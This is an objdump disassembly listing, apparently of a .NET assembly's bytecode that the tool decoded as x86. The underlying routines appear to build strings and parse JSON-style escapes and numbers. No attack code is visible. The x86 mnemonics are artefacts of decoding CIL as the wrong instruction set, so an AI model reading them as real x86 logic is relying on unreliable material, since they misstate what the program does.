  403697:	00 00                	add    %al,(%eax)
  403699:	0a 26                	or     (%esi),%ah
  40369b:	11 05 72 b7 05 00    	adc    %eax,0x5b772
  4036a1:	70 6f                	jo     0x403712
  4036a3:	5a                   	pop    %edx
  4036a4:	00 00                	add    %al,(%eax)
  4036a6:	0a 11                	or     (%ecx),%dl
  4036a8:	08 6f 5c             	or     %ch,0x5c(%edi)
  4036ab:	00 00                	add    %al,(%eax)
  4036ad:	0a 72 05             	or     0x5(%edx),%dh
  4036b0:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  4036b5:	00 00                	add    %al,(%eax)
  4036b7:	0a 26                	or     (%esi),%ah
  4036b9:	11 05 72 c1 05 00    	adc    %eax,0x5c172
  4036bf:	70 6f                	jo     0x403730
  4036c1:	5a                   	pop    %edx
  4036c2:	00 00                	add    %al,(%eax)
  4036c4:	0a 11                	or     (%ecx),%dl
  4036c6:	09 6f 5c             	or     %ebp,0x5c(%edi)
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	0a 26                	or     (%esi),%ah
  4036cd:	11 05 72 cb 05 00    	adc    %eax,0x5cb72
  4036d3:	70 6f                	jo     0x403744
  4036d5:	5a                   	pop    %edx
  4036d6:	00 00                	add    %al,(%eax)
  4036d8:	0a 26                	or     (%esi),%ah
  4036da:	00 11                	add    %dl,(%ecx)
  4036dc:	06                   	push   %es
  4036dd:	17                   	pop    %ss
  4036de:	58                   	pop    %eax
  4036df:	13 06                	adc    (%esi),%eax
  4036e1:	11 06                	adc    %eax,(%esi)
  4036e3:	11 0c 7b             	adc    %ecx,(%ebx,%edi,2)
  4036e6:	32 00                	xor    (%eax),%al
  4036e8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4036eb:	60                   	pusha
  4036ec:	00 00                	add    %al,(%eax)
  4036ee:	0a fe                	or     %dh,%bh
  4036f0:	04 13                	add    $0x13,%al
  4036f2:	0e                   	push   %cs
  4036f3:	11 0e                	adc    %ecx,(%esi)
  4036f5:	3a 8b fe ff ff 11    	cmp    0x11fffffe(%ebx),%cl
  4036fb:	05 72 cf 05 00       	add    $0x5cf72,%eax
  403700:	70 6f                	jo     0x403771
  403702:	5a                   	pop    %edx
  403703:	00 00                	add    %al,(%eax)
  403705:	0a 26                	or     (%esi),%ah
  403707:	11 05 6f 2d 00 00    	adc    %eax,0x2d6f
  40370d:	0a 13                	or     (%ebx),%dl
  40370f:	0d 2b 00 11 0d       	or     $0xd11002b,%eax
  403714:	2a 00                	sub    (%eax),%al
  403716:	00 00                	add    %al,(%eax)
  403718:	01 10                	add    %edx,(%eax)
  40371a:	00 00                	add    %al,(%eax)
  40371c:	02 00                	add    (%eax),%al
  40371e:	5b                   	pop    %ebx
  40371f:	00 33                	add    %dh,(%ebx)
  403721:	8e 00                	mov    (%eax),%es
  403723:	14 00                	adc    $0x0,%al
  403725:	00 00                	add    %al,(%eax)
  403727:	00 13                	add    %dl,(%ebx)
  403729:	30 03                	xor    %al,(%ebx)
  40372b:	00 18                	add    %bl,(%eax)
  40372d:	00 00                	add    %al,(%eax)
  40372f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403732:	00 11                	add    %dl,(%ecx)
  403734:	00 03                	add    %al,(%ebx)
  403736:	20 ff                	and    %bh,%bh
  403738:	ff 00                	incl   (%eax)
  40373a:	00 5f 1f             	add    %bl,0x1f(%edi)
  40373d:	10 62 02             	adc    %ah,0x2(%edx)
  403740:	20 ff                	and    %bh,%bh
  403742:	ff 00                	incl   (%eax)
  403744:	00 5f 60             	add    %bl,0x60(%edi)
  403747:	0a 2b                	or     (%ebx),%ch
  403749:	00 06                	add    %al,(%esi)
  40374b:	2a 1b                	sub    (%ebx),%bl
  40374d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403750:	58                   	pop    %eax
  403751:	00 00                	add    %al,(%eax)
  403753:	00 0d 00 00 11 00    	add    %cl,0x110000
  403759:	20 00                	and    %al,(%eax)
  40375b:	00 04 00             	add    %al,(%eax,%eax,1)
  40375e:	73 61                	jae    0x4037c1
  403760:	00 00                	add    %al,(%eax)
  403762:	0a 0a                	or     (%edx),%cl
  403764:	00 17                	add    %dl,(%edi)
  403766:	73 62                	jae    0x4037ca
  403768:	00 00                	add    %al,(%eax)
  40376a:	0a 0b                	or     (%ebx),%cl
  40376c:	07                   	pop    %es
  40376d:	6f                   	outsl  %ds:(%esi),(%dx)
  40376e:	63 00                	arpl   %eax,(%eax)
  403770:	00 0a                	add    %cl,(%edx)
  403772:	16                   	push   %ss
  403773:	7e 64                	jle    0x4037d9
  403775:	00 00                	add    %al,(%eax)
  403777:	0a 03                	or     (%ebx),%al
  403779:	73 65                	jae    0x4037e0
  40377b:	00 00                	add    %al,(%eax)
  40377d:	0a a2 02 06 7e 0f    	or     0xf7e0602(%edx),%ah
  403783:	00 00                	add    %al,(%eax)
  403785:	04 07                	add    $0x7,%al
  403787:	6f                   	outsl  %ds:(%esi),(%dx)
  403788:	66 00 00             	data16 add %al,(%eax)
  40378b:	0a 00                	or     (%eax),%al
  40378d:	07                   	pop    %es
  40378e:	6f                   	outsl  %ds:(%esi),(%dx)
  40378f:	67 00 00             	add    %al,(%bx,%si)
  403792:	0a 00                	or     (%eax),%al
  403794:	06                   	push   %es
  403795:	6f                   	outsl  %ds:(%esi),(%dx)
  403796:	68 00 00 0a 0c       	push   $0xc0a0000
  40379b:	de 10                	ficoms (%eax)
  40379d:	06                   	push   %es
  40379e:	14 fe                	adc    $0xfe,%al
  4037a0:	01 0d 09 2d 07 06    	add    %ecx,0x6072d09
  4037a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a7:	25 00 00 0a 00       	and    $0xa0000,%eax
  4037ac:	dc 00                	faddl  (%eax)
  4037ae:	08 2a                	or     %ch,(%edx)
  4037b0:	01 10                	add    %edx,(%eax)
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	02 00                	add    (%eax),%al
  4037b6:	0c 00                	or     $0x0,%al
  4037b8:	39 45 00             	cmp    %eax,0x0(%ebp)
  4037bb:	10 00                	adc    %al,(%eax)
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	00 13                	add    %dl,(%ebx)
  4037c1:	30 03                	xor    %al,(%ebx)
  4037c3:	00 4e 00             	add    %cl,0x0(%esi)
  4037c6:	00 00                	add    %al,(%eax)
  4037c8:	0e                   	push   %cs
  4037c9:	00 00                	add    %al,(%eax)
  4037cb:	11 00                	adc    %eax,(%eax)
  4037cd:	28 69 00             	sub    %ch,0x0(%ecx)
  4037d0:	00 0a                	add    %cl,(%edx)
  4037d2:	0a 00                	or     (%eax),%al
  4037d4:	06                   	push   %es
  4037d5:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4037da:	2b 09                	sub    (%ecx),%ecx
  4037dc:	11 04 9a             	adc    %eax,(%edx,%ebx,4)
  4037df:	0b 00                	or     (%eax),%eax
  4037e1:	07                   	pop    %es
  4037e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e3:	6a 00                	push   $0x0
  4037e5:	00 0a                	add    %cl,(%edx)
  4037e7:	72 d5                	jb     0x4037be
  4037e9:	05 00 70 1b 28       	add    $0x281b7000,%eax
  4037ee:	6b 00 00             	imul   $0x0,(%eax),%eax
  4037f1:	0a 16                	or     (%esi),%dl
  4037f3:	fe 01                	incb   (%ecx)
  4037f5:	13 05 11 05 2d 04    	adc    0x42d0511,%eax
  4037fb:	07                   	pop    %es
  4037fc:	0c de                	or     $0xde,%al
  4037fe:	18 00                	sbb    %al,(%eax)
  403800:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403803:	58                   	pop    %eax
  403804:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403807:	04 09                	add    $0x9,%al
  403809:	8e 69 fe             	mov    -0x2(%ecx),%gs
  40380c:	04 13                	add    $0x13,%al
  40380e:	05 11 05 2d c8       	add    $0xc82d0511,%eax
  403813:	14 0c                	adc    $0xc,%al
  403815:	2b 00                	sub    (%eax),%eax
  403817:	00 08                	add    %cl,(%eax)
  403819:	2a 00                	sub    (%eax),%al
  40381b:	00 13                	add    %dl,(%ebx)
  40381d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403820:	db 01                	fildl  (%ecx)
  403822:	00 00                	add    %al,(%eax)
  403824:	0f 00 00             	sldt   (%eax)
  403827:	11 00                	adc    %eax,(%eax)
  403829:	72 eb                	jb     0x403816
  40382b:	05 00 70 03 72       	add    $0x72037000,%eax
  403830:	eb 05                	jmp    0x403837
  403832:	00 70 28             	add    %dh,0x28(%eax)
  403835:	6c                   	insb   (%dx),%es:(%edi)
  403836:	00 00                	add    %al,(%eax)
  403838:	0a 0a                	or     (%edx),%cl
  40383a:	02 06                	add    (%esi),%al
  40383c:	1a 6f 6d             	sbb    0x6d(%edi),%ch
  40383f:	00 00                	add    %al,(%eax)
  403841:	0a 0b                	or     (%ebx),%cl
  403843:	07                   	pop    %es
  403844:	16                   	push   %ss
  403845:	fe 04 16             	incb   (%esi,%edx,1)
  403848:	fe 01                	incb   (%ecx)
  40384a:	13 06                	adc    (%esi),%eax
  40384c:	11 06                	adc    %eax,(%esi)
  40384e:	2d 08 14 13 05       	sub    $0x5131408,%eax
  403853:	38 a8 01 00 00 02    	cmp    %ch,0x2000001(%eax)
  403859:	1f                   	pop    %ds
  40385a:	3a 07                	cmp    (%edi),%al
  40385c:	06                   	push   %es
  40385d:	6f                   	outsl  %ds:(%esi),(%dx)
  40385e:	6e                   	outsb  %ds:(%esi),(%dx)
  40385f:	00 00                	add    %al,(%eax)
  403861:	0a 58 6f             	or     0x6f(%eax),%bl
  403864:	6f                   	outsl  %ds:(%esi),(%dx)
  403865:	00 00                	add    %al,(%eax)
  403867:	0a 0b                	or     (%ebx),%cl
  403869:	07                   	pop    %es
  40386a:	16                   	push   %ss
  40386b:	fe 04 16             	incb   (%esi,%edx,1)
  40386e:	fe 01                	incb   (%ecx)
  403870:	13 06                	adc    (%esi),%eax
  403872:	11 06                	adc    %eax,(%esi)
  403874:	2d 08 14 13 05       	sub    $0x5131408,%eax
  403879:	38 82 01 00 00 07    	cmp    %al,0x7000001(%edx)
  40387f:	17                   	pop    %ss
  403880:	58                   	pop    %eax
  403881:	0b 2b                	or     (%ebx),%ebp
  403883:	04 07                	add    $0x7,%al
  403885:	17                   	pop    %ss
  403886:	58                   	pop    %eax
  403887:	0b 07                	or     (%edi),%eax
  403889:	02 6f 6e             	add    0x6e(%edi),%ch
  40388c:	00 00                	add    %al,(%eax)
  40388e:	0a 2f                	or     (%edi),%ch
  403890:	0e                   	push   %cs
  403891:	02 07                	add    (%edi),%al
  403893:	6f                   	outsl  %ds:(%esi),(%dx)
  403894:	59                   	pop    %ecx
  403895:	00 00                	add    %al,(%eax)
  403897:	0a 28                	or     (%eax),%ch
  403899:	70 00                	jo     0x40389b
  40389b:	00 0a                	add    %cl,(%edx)
  40389d:	2b 01                	sub    (%ecx),%eax
  40389f:	16                   	push   %ss
  4038a0:	00 13                	add    %dl,(%ebx)
  4038a2:	06                   	push   %es
  4038a3:	11 06                	adc    %eax,(%esi)
  4038a5:	2d dd 07 02 6f       	sub    $0x6f0207dd,%eax
  4038aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4038ab:	00 00                	add    %al,(%eax)
  4038ad:	0a 2f                	or     (%edi),%ch
  4038af:	0d 02 07 6f 59       	or     $0x596f0702,%eax
  4038b4:	00 00                	add    %al,(%eax)
  4038b6:	0a 1f                	or     (%edi),%bl
  4038b8:	22 fe                	and    %dh,%bh
  4038ba:	01 2b                	add    %ebp,(%ebx)
  4038bc:	01 16                	add    %edx,(%esi)
  4038be:	00 13                	add    %dl,(%ebx)
  4038c0:	06                   	push   %es
  4038c1:	11 06                	adc    %eax,(%esi)
  4038c3:	2d 08 14 13 05       	sub    $0x5131408,%eax
  4038c8:	38 33                	cmp    %dh,(%ebx)
  4038ca:	01 00                	add    %eax,(%eax)
  4038cc:	00 07                	add    %al,(%edi)
  4038ce:	17                   	pop    %ss
  4038cf:	58                   	pop    %eax
  4038d0:	0b 73 71             	or     0x71(%ebx),%esi
  4038d3:	00 00                	add    %al,(%eax)
  4038d5:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4038d8:	0d 38 06 01 00       	or     $0x10638,%eax
  4038dd:	00 00                	add    %al,(%eax)
  4038df:	02 07                	add    (%edi),%al
  4038e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e2:	59                   	pop    %ecx
  4038e3:	00 00                	add    %al,(%eax)
  4038e5:	0a 13                	or     (%ebx),%dl
  4038e7:	04 09                	add    $0x9,%al
  4038e9:	16                   	push   %ss
  4038ea:	fe 01                	incb   (%ecx)
  4038ec:	13 06                	adc    (%esi),%eax
  4038ee:	11 06                	adc    %eax,(%esi)
  4038f0:	3a bb 00 00 00 00    	cmp    0x0(%ebx),%bh
  4038f6:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  4038f9:	07                   	pop    %es
  4038fa:	11 07                	adc    %eax,(%edi)
  4038fc:	1f                   	pop    %ds
  4038fd:	5c                   	pop    %esp
  4038fe:	30 17                	xor    %dl,(%edi)
  403900:	11 07                	adc    %eax,(%edi)
  403902:	1f                   	pop    %ds
  403903:	22 2e                	and    (%esi),%ch
  403905:	43                   	inc    %ebx
  403906:	11 07                	adc    %eax,(%edi)
  403908:	1f                   	pop    %ds
  403909:	2f                   	das
  40390a:	2e 53                	cs push %ebx
  40390c:	11 07                	adc    %eax,(%edi)
  40390e:	1f                   	pop    %ds
  40390f:	5c                   	pop    %esp
  403910:	2e 42                	cs inc %edx
  403912:	38 89 00 00 00 11    	cmp    %cl,0x11000000(%ecx)
  403918:	07                   	pop    %es
  403919:	1f                   	pop    %ds
  40391a:	66 30 0e             	data16 xor %cl,(%esi)
  40391d:	11 07                	adc    %eax,(%edi)
  40391f:	1f                   	pop    %ds
  403920:	62 2e                	bound  %ebp,(%esi)
  403922:	47                   	inc    %edi
  403923:	11 07                	adc    %eax,(%edi)
  403925:	1f                   	pop    %ds
  403926:	66 2e 4b             	cs dec %bx
  403929:	2b 75 11             	sub    0x11(%ebp),%esi
  40392c:	07                   	pop    %es
  40392d:	1f                   	pop    %ds
  40392e:	6e                   	outsb  %ds:(%esi),(%dx)
  40392f:	2e 4e                	cs dec %esi
  403931:	11 07                	adc    %eax,(%edi)
  403933:	1f                   	pop    %ds
  403934:	72 59                	jb     0x40398f
  403936:	45                   	inc    %ebp
  403937:	03 00                	add    (%eax),%eax
  403939:	00 00                	add    %al,(%eax)
  40393b:	43                   	inc    %ebx
  40393c:	00 00                	add    %al,(%eax)
  40393e:	00 59 00             	add    %bl,0x0(%ecx)
  403941:	00 00                	add    %al,(%eax)
  403943:	4e                   	dec    %esi
  403944:	00 00                	add    %al,(%eax)
  403946:	00 2b                	add    %ch,(%ebx)
  403948:	57                   	push   %edi
  403949:	08 1f                	or     %bl,(%edi)
  40394b:	22 6f 72             	and    0x72(%edi),%ch
  40394e:	00 00                	add    %al,(%eax)
  403950:	0a 26                	or     (%esi),%ah
  403952:	2b 57 08             	sub    0x8(%edi),%edx
  403955:	1f                   	pop    %ds
  403956:	5c                   	pop    %esp
  403957:	6f                   	outsl  %ds:(%esi),(%dx)
  403958:	72 00                	jb     0x40395a
  40395a:	00 0a                	add    %cl,(%edx)
  40395c:	26 2b 4c 08 1f       	sub    %es:0x1f(%eax,%ecx,1),%ecx
  403961:	2f                   	das
  403962:	6f                   	outsl  %ds:(%esi),(%dx)
  403963:	72 00                	jb     0x403965
  403965:	00 0a                	add    %cl,(%edx)
  403967:	26 2b 41 08          	sub    %es:0x8(%ecx),%eax
  40396b:	1e                   	push   %ds
  40396c:	6f                   	outsl  %ds:(%esi),(%dx)
  40396d:	72 00                	jb     0x40396f
  40396f:	00 0a                	add    %cl,(%edx)
  403971:	26 2b 37             	sub    %es:(%edi),%esi
  403974:	08 1f                	or     %bl,(%edi)
  403976:	0c 6f                	or     $0x6f,%al
  403978:	72 00                	jb     0x40397a
  40397a:	00 0a                	add    %cl,(%edx)
  40397c:	26 2b 2c 08          	sub    %es:(%eax,%ecx,1),%ebp
  403980:	1f                   	pop    %ds
  403981:	0a 6f 72             	or     0x72(%edi),%ch
  403984:	00 00                	add    %al,(%eax)
  403986:	0a 26                	or     (%esi),%ah
  403988:	2b 21                	sub    (%ecx),%esp
  40398a:	08 1f                	or     %bl,(%edi)
  40398c:	0d 6f 72 00 00       	or     $0x726f,%eax
  403991:	0a 26                	or     (%esi),%ah
  403993:	2b 16                	sub    (%esi),%edx
  403995:	08 1f                	or     %bl,(%edi)
  403997:	09 6f 72             	or     %ebp,0x72(%edi)
  40399a:	00 00                	add    %al,(%eax)
  40399c:	0a 26                	or     (%esi),%ah
  40399e:	2b 0b                	sub    (%ebx),%ecx
  4039a0:	08 11                	or     %dl,(%ecx)
  4039a2:	04 6f                	add    $0x6f,%al
  4039a4:	72 00                	jb     0x4039a6
  4039a6:	00 0a                	add    %cl,(%edx)
  4039a8:	26 2b 00             	sub    %es:(%eax),%eax
  4039ab:	16                   	push   %ss
  4039ac:	0d 00 2b 2f 00       	or     $0x2f2b00,%eax
  4039b1:	11 04 1f             	adc    %eax,(%edi,%ebx,1)
  4039b4:	5c                   	pop    %esp
  4039b5:	fe 01                	incb   (%ecx)
  4039b7:	16                   	push   %ss
  4039b8:	fe 01                	incb   (%ecx)
  4039ba:	13 06                	adc    (%esi),%eax
  4039bc:	11 06                	adc    %eax,(%esi)
  4039be:	2d 04 17 0d 2b       	sub    $0x2b0d1704,%eax
  4039c3:	1a 11                	sbb    (%ecx),%dl
  4039c5:	04 1f                	add    $0x1f,%al
  4039c7:	22 fe                	and    %dh,%bh
  4039c9:	01 16                	add    %edx,(%esi)
  4039cb:	fe 01                	incb   (%ecx)
  4039cd:	13 06                	adc    (%esi),%eax
  4039cf:	11 06                	adc    %eax,(%esi)
  4039d1:	2d 02 2b 21 08       	sub    $0x8212b02,%eax
  4039d6:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4039d9:	72 00                	jb     0x4039db
  4039db:	00 0a                	add    %cl,(%edx)
  4039dd:	26 00 00             	add    %al,%es:(%eax)
  4039e0:	07                   	pop    %es
  4039e1:	17                   	pop    %ss
  4039e2:	58                   	pop    %eax
  4039e3:	0b 07                	or     (%edi),%eax
  4039e5:	02 6f 6e             	add    0x6e(%edi),%ch
  4039e8:	00 00                	add    %al,(%eax)
  4039ea:	0a fe                	or     %dh,%bh
  4039ec:	04 13                	add    $0x13,%al
  4039ee:	06                   	push   %es
  4039ef:	11 06                	adc    %eax,(%esi)
  4039f1:	3a e8                	cmp    %al,%ch
  4039f3:	fe                   	(bad)
  4039f4:	ff                   	(bad)
  4039f5:	ff 08                	decl   (%eax)
  4039f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f8:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  4039fd:	05 2b 00 11 05       	add    $0x511002b,%eax
  403a02:	2a 00                	sub    (%eax),%al
  403a04:	13 30                	adc    (%eax),%esi
  403a06:	04 00                	add    $0x0,%al
  403a08:	be 01 00 00 10       	mov    $0x10000001,%esi
  403a0d:	00 00                	add    %al,(%eax)
  403a0f:	11 00                	adc    %eax,(%eax)
  403a11:	72 eb                	jb     0x4039fe
  403a13:	05 00 70 03 72       	add    $0x72037000,%eax
  403a18:	eb 05                	jmp    0x403a1f
  403a1a:	00 70 28             	add    %dh,0x28(%eax)
  403a1d:	6c                   	insb   (%dx),%es:(%edi)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	0a 0a                	or     (%edx),%cl
  403a22:	02 06                	add    (%esi),%al
  403a24:	1a 6f 6d             	sbb    0x6d(%edi),%ch
  403a27:	00 00                	add    %al,(%eax)
  403a29:	0a 0b                	or     (%ebx),%cl
  403a2b:	07                   	pop    %es
  403a2c:	16                   	push   %ss
  403a2d:	fe 04 16             	incb   (%esi,%edx,1)
  403a30:	fe 01                	incb   (%ecx)
  403a32:	13 06                	adc    (%esi),%eax
  403a34:	11 06                	adc    %eax,(%esi)
  403a36:	2d 08 04 13 05       	sub    $0x5130408,%eax
  403a3b:	38 8b 01 00 00 02    	cmp    %cl,0x2000001(%ebx)
  403a41:	1f                   	pop    %ds
  403a42:	3a 07                	cmp    (%edi),%al
  403a44:	06                   	push   %es
  403a45:	6f                   	outsl  %ds:(%esi),(%dx)
  403a46:	6e                   	outsb  %ds:(%esi),(%dx)
  403a47:	00 00                	add    %al,(%eax)
  403a49:	0a 58 6f             	or     0x6f(%eax),%bl
  403a4c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a4d:	00 00                	add    %al,(%eax)
  403a4f:	0a 0b                	or     (%ebx),%cl
  403a51:	07                   	pop    %es
  403a52:	16                   	push   %ss
  403a53:	fe 04 16             	incb   (%esi,%edx,1)
  403a56:	fe 01                	incb   (%ecx)
  403a58:	13 06                	adc    (%esi),%eax
  403a5a:	11 06                	adc    %eax,(%esi)
  403a5c:	2d 08 04 13 05       	sub    $0x5130408,%eax
  403a61:	38 65 01             	cmp    %ah,0x1(%ebp)
  403a64:	00 00                	add    %al,(%eax)
  403a66:	07                   	pop    %es
  403a67:	17                   	pop    %ss
  403a68:	58                   	pop    %eax
  403a69:	0b 2b                	or     (%ebx),%ebp
  403a6b:	04 07                	add    $0x7,%al
  403a6d:	17                   	pop    %ss
  403a6e:	58                   	pop    %eax
  403a6f:	0b 07                	or     (%edi),%eax
  403a71:	02 6f 6e             	add    0x6e(%edi),%ch
  403a74:	00 00                	add    %al,(%eax)
  403a76:	0a 2f                	or     (%edi),%ch
  403a78:	0e                   	push   %cs
  403a79:	02 07                	add    (%edi),%al
  403a7b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a7c:	59                   	pop    %ecx
  403a7d:	00 00                	add    %al,(%eax)
  403a7f:	0a 28                	or     (%eax),%ch
  403a81:	70 00                	jo     0x403a83
  403a83:	00 0a                	add    %cl,(%edx)
  403a85:	2b 01                	sub    (%ecx),%eax
  403a87:	16                   	push   %ss
  403a88:	00 13                	add    %dl,(%ebx)
  403a8a:	06                   	push   %es
  403a8b:	11 06                	adc    %eax,(%esi)
  403a8d:	2d dd 07 0c 07       	sub    $0x70c07dd,%eax
  403a92:	02 6f 6e             	add    0x6e(%edi),%ch
  403a95:	00 00                	add    %al,(%eax)
  403a97:	0a 2f                	or     (%edi),%ch
  403a99:	1f                   	pop    %ds
  403a9a:	02 07                	add    (%edi),%al
  403a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9d:	59                   	pop    %ecx
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	0a 1f                	or     (%edi),%bl
  403aa2:	2d 2e 10 02 07       	sub    $0x702102e,%eax
  403aa7:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa8:	59                   	pop    %ecx
  403aa9:	00 00                	add    %al,(%eax)
  403aab:	0a 1f                	or     (%edi),%bl
  403aad:	2b fe                	sub    %esi,%edi
  403aaf:	01 16                	add    %edx,(%esi)
  403ab1:	fe 01                	incb   (%ecx)
  403ab3:	2b 01                	sub    (%ecx),%eax
  403ab5:	16                   	push   %ss
  403ab6:	00 2b                	add    %ch,(%ebx)
  403ab8:	01 17                	add    %edx,(%edi)
  403aba:	00 13                	add    %dl,(%ebx)
  403abc:	06                   	push   %es
  403abd:	11 06                	adc    %eax,(%esi)
  403abf:	2d 04 07 17 58       	sub    $0x58170704,%eax
  403ac4:	0b 2b                	or     (%ebx),%ebp
  403ac6:	04 07                	add    $0x7,%al
  403ac8:	17                   	pop    %ss
  403ac9:	58                   	pop    %eax
  403aca:	0b 07                	or     (%edi),%eax
  403acc:	02 6f 6e             	add    0x6e(%edi),%ch
  403acf:	00 00                	add    %al,(%eax)
  403ad1:	0a 2f                	or     (%edi),%ch
  403ad3:	0e                   	push   %cs
  403ad4:	02 07                	add    (%edi),%al
  403ad6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ad7:	59                   	pop    %ecx
  403ad8:	00 00                	add    %al,(%eax)
  403ada:	0a 28                	or     (%eax),%ch
  403adc:	73 00                	jae    0x403ade
  403ade:	00 0a                	add    %cl,(%edx)
  403ae0:	2b 01                	sub    (%ecx),%eax
  403ae2:	16                   	push   %ss
  403ae3:	00 13                	add    %dl,(%ebx)
  403ae5:	06                   	push   %es
  403ae6:	11 06                	adc    %eax,(%esi)
  403ae8:	2d dd 07 08 fe       	sub    $0xfe0807dd,%eax
  403aed:	02 16                	add    (%esi),%dl
  403aef:	fe 01                	incb   (%ecx)
  403af1:	13 06                	adc    (%esi),%eax
  403af3:	11 06                	adc    %eax,(%esi)
  403af5:	2d 24 00 02 08       	sub    $0x8020024,%eax
  403afa:	07                   	pop    %es
  403afb:	08 59 6f             	or     %bl,0x6f(%ecx)
  403afe:	74 00                	je     0x403b00
  403b00:	00 0a                	add    %cl,(%edx)
  403b02:	12 03                	adc    (%ebx),%al
  403b04:	28 12                	sub    %dl,(%edx)
  403b06:	00 00                	add    %al,(%eax)
  403b08:	0a 16                	or     (%esi),%dl
  403b0a:	fe 01                	incb   (%ecx)
  403b0c:	13 06                	adc    (%esi),%eax
  403b0e:	11 06                	adc    %eax,(%esi)
  403b10:	2d 08 09 13 05       	sub    $0x5130908,%eax
  403b15:	38 b1 00 00 00 00    	cmp    %dh,0x0(%ecx)
  403b1b:	08 0b                	or     %cl,(%ebx)
  403b1d:	07                   	pop    %es
  403b1e:	02 6f 6e             	add    0x6e(%edi),%ch
  403b21:	00 00                	add    %al,(%eax)
  403b23:	0a 2f                	or     (%edi),%ch
  403b25:	1f                   	pop    %ds
  403b26:	02 07                	add    (%edi),%al
  403b28:	6f                   	outsl  %ds:(%esi),(%dx)
  403b29:	59                   	pop    %ecx
  403b2a:	00 00                	add    %al,(%eax)
  403b2c:	0a 1f                	or     (%edi),%bl
  403b2e:	2d 2e 10 02 07       	sub    $0x702102e,%eax
  403b33:	6f                   	outsl  %ds:(%esi),(%dx)
  403b34:	59                   	pop    %ecx
  403b35:	00 00                	add    %al,(%eax)
  403b37:	0a 1f                	or     (%edi),%bl
  403b39:	2b fe                	sub    %esi,%edi
  403b3b:	01 16                	add    %edx,(%esi)
  403b3d:	fe 01                	incb   (%ecx)
  403b3f:	2b 01                	sub    (%ecx),%eax
  403b41:	16                   	push   %ss
  403b42:	00 2b                	add    %ch,(%ebx)
  403b44:	01 17                	add    %edx,(%edi)
  403b46:	00 13                	add    %dl,(%ebx)
  403b48:	06                   	push   %es
  403b49:	11 06                	adc    %eax,(%esi)
  403b4b:	2d 04 07 17 58       	sub    $0x58170704,%eax
  403b50:	0b 2b                	or     (%ebx),%ebp
  403b52:	04 07                	add    $0x7,%al
  403b54:	17                   	pop    %ss
  403b55:	58                   	pop    %eax
  403b56:	0b 07                	or     (%edi),%eax
  403b58:	02 6f 6e             	add    0x6e(%edi),%ch
  403b5b:	00 00                	add    %al,(%eax)
  403b5d:	0a 2f                	or     (%edi),%ch
  403b5f:	1f                   	pop    %ds
  403b60:	02 07                	add    (%edi),%al
  403b62:	6f                   	outsl  %ds:(%esi),(%dx)
  403b63:	59                   	pop    %ecx
  403b64:	00 00                	add    %al,(%eax)
  403b66:	0a 28                	or     (%eax),%ch
  403b68:	73 00                	jae    0x403b6a
  403b6a:	00 0a                	add    %cl,(%edx)
  403b6c:	2d 0d 02 07 6f       	sub    $0x6f07020d,%eax
  403b71:	59                   	pop    %ecx
  403b72:	00 00                	add    %al,(%eax)
  403b74:	0a 1f                	or     (%edi),%bl
  403b76:	2e fe 01             	incb   %cs:(%ecx)
  403b79:	2b 01                	sub    (%ecx),%eax
  403b7b:	17                   	pop    %ss
  403b7c:	00 2b                	add    %ch,(%ebx)
  403b7e:	01 16                	add    %edx,(%esi)
  403b80:	00 13                	add    %dl,(%ebx)
  403b82:	06                   	push   %es
  403b83:	11 06                	adc    %eax,(%esi)
  403b85:	2d cc 07 08 fe       	sub    $0xfe0807cc,%eax
  403b8a:	02 16                	add    (%esi),%dl
  403b8c:	fe 01                	incb   (%ecx)
  403b8e:	13 06                	adc    (%esi),%eax
  403b90:	11 06                	adc    %eax,(%esi)
  403b92:	2d 32 00 02 08       	sub    $0x8020032,%eax
  403b97:	07                   	pop    %es
  403b98:	08 59 6f             	or     %bl,0x6f(%ecx)
  403b9b:	74 00                	je     0x403b9d
  403b9d:	00 0a                	add    %cl,(%edx)
  403b9f:	20 a7 00 00 00 28    	and    %ah,0x28000000(%edi)
  403ba5:	5d                   	pop    %ebp
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	0a 12                	or     (%edx),%dl
  403baa:	04 28                	add    $0x28,%al
  403bac:	75 00                	jne    0x403bae
  403bae:	00 0a                	add    %cl,(%edx)
  403bb0:	16                   	push   %ss
  403bb1:	fe 01                	incb   (%ecx)
  403bb3:	13 06                	adc    (%esi),%eax
  403bb5:	11 06                	adc    %eax,(%esi)
  403bb7:	2d 0c 11 04 28       	sub    $0x2804110c,%eax
  403bbc:	76 00                	jbe    0x403bbe
  403bbe:	00 0a                	add    %cl,(%edx)
  403bc0:	69 13 05 2b 06 00    	imul   $0x62b05,(%ebx),%edx
  403bc6:	04 13                	add    $0x13,%al
  403bc8:	05 2b 00 11 05       	add    $0x511002b,%eax
  403bcd:	2a 00                	sub    (%eax),%al
  403bcf:	00 13                	add    %dl,(%ebx)
  403bd1:	30 03                	xor    %al,(%ebx)
  403bd3:	00 10                	add    %dl,(%eax)
  403bd5:	01 00                	add    %eax,(%eax)
  403bd7:	00 11                	add    %dl,(%ecx)
  403bd9:	00 00                	add    %al,(%eax)
  403bdb:	11 00                	adc    %eax,(%eax)
  403bdd:	02 28                	add    (%eax),%ch
  403bdf:	54                   	push   %esp
